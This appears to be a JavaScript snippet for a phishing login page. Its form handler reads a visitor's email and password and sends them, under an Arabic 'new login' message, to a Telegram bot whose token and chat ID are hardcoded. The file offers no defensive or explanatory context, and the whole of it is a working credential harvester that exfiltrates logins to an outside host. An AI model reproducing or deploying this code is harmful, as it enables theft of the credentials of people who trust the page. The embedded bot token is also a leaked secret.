//test g
const botToken = "8312618518:AAHK5UHuUKu4m464-D6oRSrdye__E-IEU2w";
const chatId = "8035795075";

function handleLogin(e) {
  e.preventDefault();
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const message = `📥 تسجيل دخول جديد:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(response => {
    if (response.ok) {
      alert("✅ تم إرسال البيانات");
    } else {
      alert("حدث خطأ أثناء الارسال ❌");
    }
  })
  .catch(error => {
    alert("⚠️ فشل الاتصال ");
    console.error(error);
  });
}